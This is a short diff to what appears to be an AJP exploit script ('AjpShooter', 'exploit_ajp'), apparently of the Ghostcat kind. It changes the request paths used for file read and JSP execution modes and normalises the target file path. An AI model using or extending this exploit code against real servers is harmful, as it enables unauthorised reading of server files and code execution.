@@ -289,9 +289,9 @@ class AjpShooter(object):
             attributes.append((b"req_attribute", req_attr))
 
         if self.shooter == 'read':
-            self.url += '/favicon.ico'
+            self.url += '/index.txt'
         else:
-            self.url += '/favicon.jsp'
+            self.url += '/index.jsp'
 
         ajp_ip = urlparse(self.url).hostname
 
@@ -320,7 +320,7 @@ def exploit_ajp(url, ajp_port, target_file, method='GET', headers={}):
         'headers': headers,
         'method': method,
         'ajp_port': ajp_port,
-        'target_file': target_file
+        'target_file': target_file if target_file.startswith("/") else "/" + target_file
     }
     try:
         ret = AjpShooter(_).shoot()
